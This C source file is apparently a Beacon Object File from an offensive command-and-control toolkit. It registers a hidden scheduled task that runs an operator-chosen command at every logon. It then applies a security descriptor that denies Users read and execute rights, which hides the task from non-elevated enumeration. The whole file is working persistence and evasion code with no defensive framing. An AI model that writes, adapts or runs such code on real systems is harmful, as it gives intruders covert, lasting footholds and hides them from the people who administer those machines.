/*
 * bof-ghost-task <name> <command> [arguments]
 * bof-ghost-task <name> remove
 *
 * Register a logon-triggered scheduled task and then replace its security
 * descriptor with a restrictive DACL that denies read/execute to
 * BUILTIN\Users while keeping SYSTEM and Administrators.  Standard
 * non-elevated task enumeration no longer shows the task.
 *
 * Requires administrator rights to write the root task folder.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID GUID_TaskScheduler_G =
    { 0x0f87369f, 0xa4e5, 0x4cfc,
      { 0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd } };
static const GUID GUID_ITaskService_G =
    { 0x2faba4c7, 0x4da9, 0x4013,
      { 0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85 } };

typedef HRESULT (STDMETHODCALLTYPE *GetFolderFn)(void *, BSTR, LONG, ITaskFolder **);
typedef HRESULT (STDMETHODCALLTYPE *GetTaskFn)(void *, BSTR, LONG, IRegisteredTask **);

struct gsb { char *buf; int cap; int len; };

static void gsb_add(struct gsb *s, const char *t)
{
    while (*t && s->len < s->cap - 1) s->buf[s->len++] = *t++;
    s->buf[s->len] = 0;
}

static void gsb_xml(struct gsb *s, const char *t)
{
    while (*t && s->len < s->cap - 7) {
        switch (*t) {
        case '&':  gsb_add(s, "&amp;"); break;
        case '<':  gsb_add(s, "&lt;");  break;
        case '>':  gsb_add(s, "&gt;");  break;
        case '"':  gsb_add(s, "&quot;");break;
        case '\'': gsb_add(s, "&apos;");break;
        default:   s->buf[s->len++] = *t; s->buf[s->len] = 0;
        }
        t++;
    }
}

void go(char *args, int alen)
{
    datap parser;
    char *name, *command, *cargs = "";
    int nlen, clen, alen2;
    char xml[8192];
    wchar_t wname[256], wxml[8192], wsd[1024];
    BSTR bname = NULL, bxml = NULL, broot = NULL, bsd = NULL;
    ITaskService *svc = NULL;
    ITaskFolder *root = NULL;
    IRegisteredTask *task = NULL;
    VARIANT e1, e2, e3;
    HRESULT hr;
    int coinit = 0, remove;
    struct gsb s;

    BeaconDataParse(&parser, args, alen);
    name    = BeaconDataExtract(&parser, &nlen);
    command = BeaconDataExtract(&parser, &clen);
    cargs   = BeaconDataExtract(&parser, &alen2);
    if (!name || !name[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: ghost-task <name> <command> [arguments] | <name> remove\n");
        return;
    }
    if (!cargs) cargs = "";
    remove = bof_stricmp(command, "remove") == 0 ||
             bof_stricmp(command, "delete") == 0;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) coinit = 1;
    else if (hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08lx\n",
                     (unsigned long)hr);
        return;
    }
    hr = OLE32$CoCreateInstance(&GUID_TaskScheduler_G, NULL,
                                CLSCTX_INPROC_SERVER, &GUID_ITaskService_G,
                                (void **)&svc);
    if (FAILED(hr) || !svc) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance(TaskScheduler): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    bof_memzero(&e1, sizeof(e1));
    e1.vt = VT_EMPTY;
    e2 = e1; e3 = e1;
    hr = svc->lpVtbl->Connect(svc, e1, e2, e3, e1);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService::Connect: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    broot = OLEAUT32$SysAllocString(L"\\");
    bname = OLEAUT32$SysAllocString(L"");
    if (!broot || !bname) goto cleanup;
    {
        GetFolderFn fn = NULL;
        bof_memcpy(&fn, &svc->lpVtbl->GetFolder, sizeof(fn));
        hr = fn(svc, broot, 0, &root);
    }
    if (FAILED(hr) || !root) {
        BeaconPrintf(CALLBACK_ERROR, "GetFolder(root): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    OLEAUT32$SysFreeString(bname);
    bname = OLEAUT32$SysAllocString(NULL);
    if (bof_a2w(name, wname, 256) <= 0) goto cleanup;
    OLEAUT32$SysFreeString(bname);
    bname = OLEAUT32$SysAllocString(wname);
    if (!bname) goto cleanup;

    if (remove) {
        hr = root->lpVtbl->DeleteTask(root, bname, 0);
        if (SUCCEEDED(hr))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] task removed: %s\n", name);
        else
            BeaconPrintf(CALLBACK_ERROR, "DeleteTask: 0x%08lx\n",
                         (unsigned long)hr);
        goto cleanup;
    }

    s.buf = xml; s.cap = sizeof(xml); s.len = 0; xml[0] = 0;
    gsb_add(&s, "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
                "<RegistrationInfo><Author>AdaptixBOFKit</Author></RegistrationInfo>"
                "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
                "<Principals><Principal id=\"Author\"><LogonType>InteractiveToken</LogonType>"
                "<RunLevel>LeastPrivilege</RunLevel></Principal></Principals>"
                "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
                "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
                "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>"
                "<AllowHardTerminate>true</AllowHardTerminate>"
                "<StartWhenAvailable>true</StartWhenAvailable>"
                "<AllowStartOnDemand>true</AllowStartOnDemand>"
                "<Enabled>true</Enabled><Hidden>true</Hidden>"
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>"
                "<Actions Context=\"Author\"><Exec><Command>");
    gsb_xml(&s, command);
    gsb_add(&s, "</Command><Arguments>");
    gsb_xml(&s, cargs);
    gsb_add(&s, "</Arguments></Exec></Actions></Task>");

    if (bof_a2w(xml, wxml, 8192) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "task XML too long\n");
        goto cleanup;
    }
    bxml = OLEAUT32$SysAllocString(wxml);
    if (!bxml) goto cleanup;

    hr = root->lpVtbl->RegisterTask(root, bname, bxml, TASK_CREATE_OR_UPDATE,
                                    e1, e2, TASK_LOGON_INTERACTIVE_TOKEN,
                                    e3, &task);
    if (FAILED(hr) || !task) {
        BeaconPrintf(CALLBACK_ERROR, "RegisterTask: 0x%08lx (admin?)\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] task registered: %s\n", name);

    if (bof_a2w("D:(D;;FRFX;;;BU)(A;;GA;;;SY)(A;;GA;;;BA)", wsd, 1024) > 0) {
        bsd = OLEAUT32$SysAllocString(wsd);
        if (bsd) {
            hr = task->lpVtbl->SetSecurityDescriptor(task, bsd, 0);
            if (SUCCEEDED(hr))
                BeaconPrintf(CALLBACK_OUTPUT,
                             "[+] restrictive DACL applied (hidden from Users)\n");
            else
                BeaconPrintf(CALLBACK_OUTPUT,
                             "[!] SetSecurityDescriptor: 0x%08lx\n",
                             (unsigned long)hr);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] remove: ghost-task %s remove\n", name);

cleanup:
    if (task) task->lpVtbl->Release(task);
    if (root) root->lpVtbl->Release(root);
    if (svc) svc->lpVtbl->Release(svc);
    if (bsd) OLEAUT32$SysFreeString(bsd);
    if (bxml) OLEAUT32$SysFreeString(bxml);
    if (bname) OLEAUT32$SysFreeString(bname);
    if (broot) OLEAUT32$SysFreeString(broot);
    if (coinit) OLE32$CoUninitialize();
}
